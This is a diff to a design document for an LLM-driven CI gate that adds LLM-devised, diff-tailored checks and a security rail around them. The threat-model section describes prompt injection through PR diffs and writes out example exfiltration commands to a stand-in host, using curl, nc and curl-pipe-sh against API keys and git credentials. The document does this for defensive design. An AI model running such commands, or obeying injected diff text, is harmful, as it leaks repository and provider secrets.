@@ -6,9 +6,11 @@ Related: the read-only audit and migration-PR contracts in
 [CI_AUDIT_WIZARD.md](CI_AUDIT_WIZARD.md), the decision record
 [adr/0002-single-gate-and-ci-audit-wizard.md](adr/0002-single-gate-and-ci-audit-wizard.md),
 the execution model in
-[#325](https://github.com/EffortlessMetrics/ub-review/issues/325), and the gate
+[#325](https://github.com/EffortlessMetrics/ub-review/issues/325), the gate
 surface in
-[specs/UB-REVIEW-SPEC-0003-intelligent-ci-gate.md](specs/UB-REVIEW-SPEC-0003-intelligent-ci-gate.md).
+[specs/UB-REVIEW-SPEC-0003-intelligent-ci-gate.md](specs/UB-REVIEW-SPEC-0003-intelligent-ci-gate.md),
+and the model-influenced-execution provenance precedent in
+[unsafe-review-swarm #1514](https://github.com/EffortlessMetrics/unsafe-review-swarm/issues/1514).
 
 `init` / `align` is the onboarding motion for the single-gate design. `audit-ci`
 and `setup-ci` are the read-only report and the migration-PR generator under it;
@@ -56,10 +58,17 @@ only when the diff warrants them. `init` / `align` migrates a repo toward that
 shape. The framing is **right-sizing, not downgrading**: less fixed CI, more
 useful proof.
 
-## The runtime model: two lists, one runner
+## The runtime model: required floor, suggested catalog, devised checks
 
-The output of onboarding is two lists and a runtime rule that draws from them.
-This is the backbone of the whole design.
+The output of onboarding is two lists and a runtime rule that draws from them —
+plus a third fill source the runtime devises per PR. This is the backbone of the
+whole design. The fills are: **required** (always) + **suggested-catalog picks**
++ **LLM-devised PR-specific checks**, all advisory, all inside the 30/60 budget.
+
+The devised-check capability is powerful, and it carries a load-bearing
+security rail; the rail is specified in its own section below
+([Security rail](#security-rail-constraining-llm-devised-execution)) and is not
+optional.
 
 ### 1. Tight required list — the deterministic floor that always blocks
 
@@ -76,12 +85,14 @@ required list  -> runs on every PR, every head SHA
                -> kept tight on purpose
 ```
 
-### 2. Longer structured suggested list — the catalog, never mandatory
+### 2. Longer structured suggested list — the starting catalog, never mandatory
 
 Everything else: classified, cataloged, but not mandatory. These are the
 checks and sensors a run *may* execute. The list is **structured, not a flat
 dump** — each entry carries enough metadata that the runtime can select from
-it intelligently:
+it intelligently. It is a **starting catalog, not a ceiling**: it seeds the
+runtime with known-good checks, but the runtime is not limited to it (see
+section 4). Each entry:
 
 ```json
 {
@@ -123,45 +134,41 @@ This is the same "build shared context once, overlap model investigation with
 local proof" stance from [WHY_THIS_DESIGN.md](WHY_THIS_DESIGN.md), applied to
 onboarding: the suggested list is the menu the overlap draws from.
 
-The careful de-bloat analysis exists to produce exactly these two lists from a
-bloated CI: collapse a pile of parallel required checks into ONE tight required
-floor plus a structured suggested catalog the LLM draws from.
+### 4. LLM-devised PR-specific checks — beyond the catalog
 
-### 4. Beyond the catalog: LLM-devised PR-specific checks
+The suggested catalog is a starting point, not a ceiling. The most valuable
+fills are often the ones no static catalog could enumerate ahead of time,
+because they are tailored to *this* diff against *this* repo. From the PR diff
+plus repo context, the runtime can **devise or select checks that are not in
+the suggested list**:
 
-The suggested list is a starting catalog, not a ceiling. From the PR diff and
-repo context the LLM can also devise checks nobody pre-listed: a diff that
-touches a parser can trigger a targeted fuzz of that parser; an FFI seam can
-trigger that boundary's test; a config change can trigger its validation. So the
-runtime fill is required (always) + suggested-catalog picks + LLM-devised
-PR-specific checks — all advisory, all inside the same time budget.
+```text
+diff touches a parser          -> fuzz that parser
+diff touches an FFI seam       -> run that targeted boundary test
+diff touches a config schema   -> validate the config
+diff adds an unsafe block      -> run the unsafe-review witness route on it
+diff touches a serializer      -> round-trip / differential check on it
+```
 
-This is the most powerful part of the model and the part that most needs rails:
-the LLM is now choosing commands to run, influenced by PR-controlled diff
-content, on a runner that may hold org secrets. A hostile or prompt-injected
-diff could steer a devised command toward exfiltration (`curl ... | sh`, dumping
-`$SECRETS`). The capability is only safe behind a hard execution boundary:
+This is the power of the design: diff-tailored checking that meets the PR where
+it is, instead of a fixed job list that runs the same things regardless of what
+changed. The devised checks are advisory like the catalog fills, counted
+against the same budget, and — because the runtime is now choosing commands to
+run under the influence of PR-controlled diff content — **constrained by the
+security rail below. The rail is what makes this capability safe to ship; it is
+not optional.**
 
-- **No secrets in the devised-execution environment.** Devised checks run in a
-  sandbox with no access to provider keys or tokens; the secret-bearing posting
-  step is a separate context. Compromising a devised command must not reach a
-  secret.
-- **Read-only analysis allowlist.** Only vetted command families (grep, build,
-  test, lint, scan) — never network egress, writes outside scratch, or arbitrary
-  exec. The diff influences *which* allowlisted check runs, never an open shell.
-- **Provenance and logging.** Every devised check is marked LLM-devised +
-  diff-influenced (untrusted input) and logged with what ran and why, so the set
-  of executed commands is auditable, never a coin flip.
-- **Advisory and budget-bounded.** Devised checks never block the merge and count
-  against the target/cap like any other fill.
-- **Fork PRs already skip the advisory layer** (no secrets); the sandbox and
-  allowlist are still required for trusted same-repo PRs, because the live risk
-  is injection inside an otherwise-legitimate diff.
+So the full runtime fill is three sources, one runner:
 
-Same risk class as unsafe-review's `confirm --allow-heavy` provenance work
-([unsafe-review-swarm #1514](https://github.com/EffortlessMetrics/unsafe-review-swarm/issues/1514)),
-at a larger surface: the power is diff-tailored checking; the discipline is
-sandbox + allowlist + provenance + advisory-only.
+```text
+required floor            always; deterministic; the only hard block
+suggested-catalog picks   advisory; selected from the structured catalog
+LLM-devised PR checks      advisory; tailored to the diff, beyond the catalog;
+                          executed only inside the security rail
+```
+
+The careful de-bloat analysis produces the required floor and the suggested
+catalog from a bloated CI; the runtime adds the devised checks on top per PR.
 
 ### Budget-bounded fills: target and cap
 
@@ -186,9 +193,12 @@ cap is the timeout's job to stop, not a new fill's.
 │ always         │ stop scheduling new fills near target │  ceiling
 ```
 
-So the three-part model is budget-bounded: required (always) + LLM-selected
-suggested fills (up to the target, hard-capped). This is how the runner stays
-usefully busy under the model latency without unbounded cost or runtime.
+So the three-part model is budget-bounded: required (always) + suggested-catalog
+picks + LLM-devised PR-specific checks, the latter two competing for the same
+fill budget (up to the target, hard-capped). Devised checks are not a budget
+loophole — they draw from the same target/cap as catalog fills. This is how the
+runner stays usefully busy under the model latency without unbounded cost or
+runtime.
 
 `init` / `align` proposes `30 / 60` as sensible defaults, documents that both
 are configurable, and the generated `ci.yml` sets the job `timeout-minutes` to
@@ -209,6 +219,110 @@ raises per-PR cost roughly proportionally (a 60-minute target is ~2x the run
 budget, hence ~2x per-PR cost). A repo that wants deeper review on every PR
 pays for it predictably; a repo that wants the floor near-free keeps the
 default and stays around $0.50/PR.
+
+## Security rail: constraining LLM-devised execution
+
+The devised-check capability (section 4) is the most powerful part of the
+runtime model and the most dangerous. It must ship with the rail below. The
+power is the diff-tailored checking; the discipline is the sandbox, the
+allowlist, provenance, and advisory-only. Document them together — neither half
+is optional.
+
+### The threat
+
+LLM-devised checks mean the model is **choosing commands to run**, and that
+choice is **influenced by PR-controlled diff content**, on a runner that may
+hold org secrets:
+
+```text
+MINIMAX_API_KEY         model provider key
+OPENCODE                OpenCode Go provider key
+GITHUB_TOKEN            scoped PR token (posting the grouped review)
+EM_RUNNER_READ_TOKEN    self-hosted runner read token
+```
+
+That is a prompt-injection-to-exfiltration surface. A malicious PR can plant
+text in the diff (a comment, a string, a test fixture, a crafted filename)
+designed to steer the model into devising a "check" that is really an
+exfiltration step:
+
+```text
+diff content (attacker-controlled)
+  -> steers the model's devised command
+  -> e.g. `curl https://evil.example/$MINIMAX_API_KEY`
+          `env | curl --data-binary @- https://evil.example`
+          `cat ~/.git-credentials | nc evil.example 80`
+          `curl evil.example/x.sh | sh`
+  -> secret leaves the runner
+```
+
+The model is reasoning over untrusted input and then acting. Treating its
+devised commands as trusted because the model is "ours" is the mistake; the
+diff that influenced them is not ours.
+
+### The rail (required, not optional)
+
+Devised-check execution is constrained on every axis:
+
+```text
+sandbox, no secrets   devised commands run in a separate execution context
+                      from the secret-bearing posting step. Secrets are NOT
+                      present in the devised-command environment — not in env,
+                      not on disk, not reachable. The step that holds
+                      GITHUB_TOKEN/MINIMAX/OPENCODE/EM_RUNNER_READ_TOKEN is a
+                      different, later, non-LLM-directed context.
+
+allowlist only        only an allowlist of read-only analysis command families
+                      may run: grep/search, build, test, lint, scan/fuzz
+                      harnesses, config validation. NEVER network egress,
+                      NEVER writes outside a scratch dir, NEVER arbitrary exec
+                      or shell-out to fetched code. Deny-by-default: a devised
+                      command not matching the allowlist does not run.
+
+provenance-marked     every devised command is recorded as LLM-devised and
+                      diff-influenced (untrusted-input provenance), distinct
+                      from deterministic required-floor and catalog fills.
+
+logged & explainable  what ran and why is logged: the command, the allowlist
+                      family it matched, and the diff signal that motivated it.
+                      Auditable after the fact, never a coin flip.
+
+advisory only         a devised check NEVER blocks the merge. Only the
+                      deterministic required floor turns the gate red. A
+                      devised check that errors is missing evidence, not a fail.
+
+budget-bounded        devised checks count against the same 30/60 target/cap
+                      as catalog fills; no separate or unbounded budget.
+```
+
+### Fork PRs vs. injected same-repo PRs
+
+Fork PRs already run with no secrets (the standard `pull_request` posture), so
+the advisory secret-bearing layer is skipped for them entirely — there is
+nothing to exfiltrate. The live risk is the subtler one: **injection inside an
+otherwise-legitimate same-repo PR**, where the secret-bearing context does
+exist. A trusted author can still merge a diff that, unbeknownst to them,
+carries injection bait in a fixture or dependency. So the sandbox + allowlist
+are required **even for trusted, same-repo PRs** — author trust is not a
+substitute for the rail, because the dangerous input is the diff, not the
+author.
+
+```text
+fork PR            no secrets present -> advisory layer skipped -> no rail needed
+same-repo PR       secrets present + diff may carry injection -> rail REQUIRED
+```
+
+### Same risk class as confirm --allow-heavy
+
+This is the same risk class as `unsafe-review`'s `confirm --allow-heavy`
+provenance discipline
+([unsafe-review-swarm #1514](https://github.com/EffortlessMetrics/unsafe-review-swarm/issues/1514)):
+model-influenced execution on a privileged runner, made safe by provenance,
+sandboxing, and an explicit capability boundary rather than by trusting the
+model. `init` / `align` applies the same principle at a **larger surface** —
+not one heavy witness behind an explicit flag, but a per-PR stream of devised
+commands — so the rail is correspondingly stricter: deny-by-default allowlist,
+no-secret sandbox, and advisory-only by construction.
 
 ## Careful-analysis methodology
 
@@ -352,7 +466,12 @@ mandatory set.
 - It **proposes and writes a reviewable plan and diff**; it does not apply
   changes. No silent overwrite of any workflow.
 - **Advisory-first**: the deterministic core floor stays the only hard gate;
-  nothing newly-blocks on the model.
+  nothing newly-blocks on the model, including LLM-devised checks.
+- **Devised execution is railed.** LLM-devised, diff-influenced checks run in a
+  no-secret sandbox, under a deny-by-default read-only allowlist, provenance-
+  marked and logged, advisory-only, and budget-bounded. The diff is untrusted
+  input; the rail, not author trust, is what contains it (see
+  [Security rail](#security-rail-constraining-llm-devised-execution)).
 - **No committed secrets.** Provider keys and tokens are referenced, never
   written into generated files.
 - **No branch-protection mutation.** The exact required-checks change is
